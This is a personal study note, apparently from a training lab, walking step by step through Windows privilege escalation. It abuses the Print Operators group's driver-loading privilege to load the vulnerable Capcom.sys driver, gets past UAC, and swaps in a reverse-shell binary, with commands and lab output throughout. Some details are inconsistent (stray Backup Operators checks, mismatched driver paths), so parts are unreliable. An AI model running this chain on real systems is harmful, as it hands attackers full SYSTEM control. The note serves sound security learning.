---
created: 2026-07-22
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---
## `Print Operators`

![[Windows groups#`Print Operators`]]

## `Print Operators` in privilege escalation

>[!warning] Beginning with **Windows 10 version `1803`**, Microsoft mitigated the classic `Print Operators` abuse by preventing `NtLoadDriver` from loading drivers referenced through registry keys under `HKEY_CURRENT_USER`, so the `Capcom.sys` technique no longer works on modern Windows versions.

- Members of the `Print Operators` group receive **`SeLoadDriverPrivilege`**, which allows them to **load kernel-mode drivers**. 
- If the driver contains a vulnerability, you can exploit it and ultimately get arbitrary code execution as `SYSTEM`.
- The classic example uses the vulnerable driver **`Capcom.sys`**, though other vulnerable drivers were abused too.

### The UAC nuisance

- Check whether the current user belongs to **`Backup Operators`**:

```powershell
whoami /group
```

```powershell
net user %USERNAME%
```

- Verify the required privileges (look for `SeBackupPrivilege` and `SeRestorePrivilege` in the output):

```powershell
whoami /priv
```

- However, in this case, **`SeLoadDriverPrivilege` will most likely be missed**.

>[!example]-
> ```powershell
> whoami /priv
> ```
> 
> ```powershell
> PRIVILEGES INFORMATION
> ----------------------
> 
> Privilege Name           Description                          State
> ======================== =================================    =======
> SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
> SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
> SeShutdownPrivilege      Shut down the system                 Disabled
> ```

- This is because Windows applies **User Account Control (UAC)** to accounts that belong to privileged groups, including `Printer Operators`.
- When such a user logs in, Windows creates **two access tokens**:
	- A **filtered token** (used by default)
	- A **full token** (used only after elevation)
- The filtered token removes or disables sensitive privileges, including `SeLoadDriverPrivilege`. So, a regular prompt won't show this privilege. To actually use it, you need an **elevated process**.

### Obtaining an elevated token

- Two common approaches to get an elevated process:
	- Open an **Administrator Command Prompt** and authenticate using the `Print Operators` account.
	- Use a **UAC bypass** technique (such as one from [`UACMe`](https://github.com/hfiref0x/UACME)).

>[!note] See the [`UACMe`](https://github.com/hfiref0x/UACME) project; it features a comprehensive list of UAC bypasses.

- After elevation, `whoami /priv` should include `SeLoadDriverPrivilege` (though it will still be disabled — until used).

### Preparing the vulnerable driver

- Download the vulnerable `Capcom.sys` driver from the [`FuzzySecurity/Capcom-Rootkit`](https://github.com/FuzzySecurity/Capcom-Rootkit) repository and save it to `C:\Temp`.

#### Creating a registry entry

- Windows loads drivers through the **Service Control Manager**, using configuration stored in the Registry.

- Before a driver can be loaded, Windows expects a registry entry describing it. For `Capcom.sys`:

```powershell
reg add HKCU\System\CurrentControlSet\Capcom /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

>[!example]-
> ```powershell
> PS C:\Windows\system32> reg add HKCU\System\CurrentControlSet\Capcom /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
> 
> Value ImagePath exists, overwrite(Yes/No)? Yes
> The operation completed successfully.
> ```

>[!note] `ImagePath` points to the driver file that Windows should load; `\??\C:\Tools\Capcom.sys` is an **[NT Object Manager path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c)** to which `C:\Tools\Capcom.sys` internally resolves.

- Create the driver type:

```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

> [!example]-
> ```powershell
> PS C:\Windows\system32> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
> 
> Value Type exists, overwrite(Yes/No)? Yes
> The operation completed successfully.
> ```

>[!note] `Type = 1` specifies this object as a **kernel-mode driver** (`SERVICE_KERNEL_DRIVER`).
#### Preparing the helper 

- To load the driver, you can use the [`EnableSeLoadDriverPrivilege.cpp`](https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp) tool helper from the [`3gstudent/Homework-of-C-Language`](https://github.com/3gstudent/Homework-of-C-Language) repository:

```powershell
wget https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/refs/heads/master/EnableSeLoadDriverPrivilege.cpp
```

- Edit it to add the following lines at the beginning:

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

- Then compile the code using `cl.exe`:

```powershell
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

>[!example]-
> ```powershell
> cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
> ```
> ```powershell
> Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
> Copyright (C) Microsoft Corporation.  All rights reserved.
> 
> EnableSeLoadDriverPrivilege.cpp
> Microsoft (R) Incremental Linker Version 14.28.29913.0
> Copyright (C) Microsoft Corporation.  All rights reserved.
> 
> /out:EnableSeLoadDriverPrivilege.exe
> EnableSeLoadDriverPrivilege.obj
> ```

#### Loading the driver 

- See the driver is not loaded ([`DriverView.exe`](http://www.nirsoft.net/utils/driverview.html)):

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

- Load the driver using the helper (`EnableSeLoadDriverPrivilege.exe` you compiled):

```
EnableSeLoadDriverPrivilege.exe
```

>[!example]-
> ```
> EnableSeLoadDriverPrivilege.exe
> ```
> 
> ```
> whoami:
> INLANEFREIGHT0\printsvc
> 
> whoami /priv
> SeMachineAccountPrivilege        Disabled
> SeLoadDriverPrivilege            Enabled
> SeShutdownPrivilege              Disabled
> SeChangeNotifyPrivilege          Enabled by default
> SeIncreaseWorkingSetPrivilege    Disabled
> NTSTATUS: 00000000, WinError: 0
> ```

- Verify the driver is loaded:

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

### Escalating privileges

- Use the [`ExploitCapcom`](https://github.com/tandasat/ExploitCapcom) tool (compile it first) to exploit the vulnerable `Capcom.sys` once you load it:

```powershell
.\ExploitCapcom.exe
```

>[!example]-
> ```powershell
> .\ExploitCapcom.exe
> ```
> 
> ```powershell
> [*] Capcom.sys exploit
> [*] Capcom.sys handle was obained as 0000000000000070
> [*] Shellcode was placed at 0000024822A50008
> [+] Shellcode was executed
> [+] Token stealing was successful
> [+] The SYSTEM shell was launched
> ```

- This launches a shell with `SYSTEM` privileges.
### No GUI

- If you don't have GUI access to the target, modify `ExploitCapcom.cpp` before compiling. You need to edit the **line `292`** to replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom` (e.g., `C:\ProgramData\revshell.exe`):

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}

```

- In this example, `CommandLine` will be:

```bash
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

- Then set up a listener and get a shell. 
## Automating the steps with `EopLoadDriver`

- Instead of performing all the above steps manually, you can use [`EoPLoadDriver`](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the entire process, including enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver.
- Download the code:

```powershell
C:\Tools\EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```

>[!example]-
> ```powershell
> PS C:\Windows\system32> C:\Tools\EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
> 
> RegCreateKeyEx failed: 0x0
> [+] Enabling SeLoadDriverPrivilege
> [+] SeLoadDriverPrivilege Enabled
> [+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
> NTSTATUS: 00000000, WinError: 0
> ```

- Then run `ExploitCapcom.exe` to get a `SYSTEM` shell or run our custom binary.

```powershell
C:\Tools\ExploitCapcom\ExploitCapcom.exe
```

![[print_operators_shell.png]]
## Clean-up

- Once you're done, delete the registry key added earlier.

```powershell
reg delete HKCU\System\CurrentControlSet\Capcom
```

>[!example]+
> ```powershell
> C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom
> ```
> 
> ```powershell
> Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes
> 
> The operation completed successfully.
> ```
